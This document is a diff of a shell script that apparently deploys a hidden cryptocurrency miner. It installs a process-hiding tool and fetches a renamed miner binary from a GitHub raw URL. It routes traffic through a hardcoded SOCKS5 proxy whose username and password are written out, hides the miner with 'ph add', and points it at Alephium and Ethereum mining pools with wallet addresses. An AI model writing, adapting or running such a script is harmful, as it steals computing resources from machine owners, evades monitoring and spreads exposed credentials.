@@ -1,3 +1,4 @@
+#!/bin/sh
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
@@ -8,7 +9,6 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -16,7 +16,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 42.203.46.122:1080
+socks5 = 52.203.46.122:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -25,18 +25,28 @@ END
 
 sleep .2
 
+echo " "
+echo " "
+
+echo "******************************************************************"
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
-chmod +x Transport
+echo "******************************************************************"
 
-apt -y install shadowsocks-libev rng-tools
+echo " "
+echo " "
 
-ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor
+chmod +x Naughty_Doctor
 
-ph add Transport
+#unset LD_PRELOAD
+#unset LD_PRELOAD_ENV
+#unset LD_LIBRARY_PATH
 
-./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+ph add Naughty_Doctor
+
+./Naughty_Doctor --disable-cpu --algorithm blake3_alephium --pool us2.alephium.herominers.com:1199 --ssl true --wallet 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.Naughty_Doctor --proxy mikrotik999:Elibawnos@52.203.46.122:1080 --gpu-boost 3
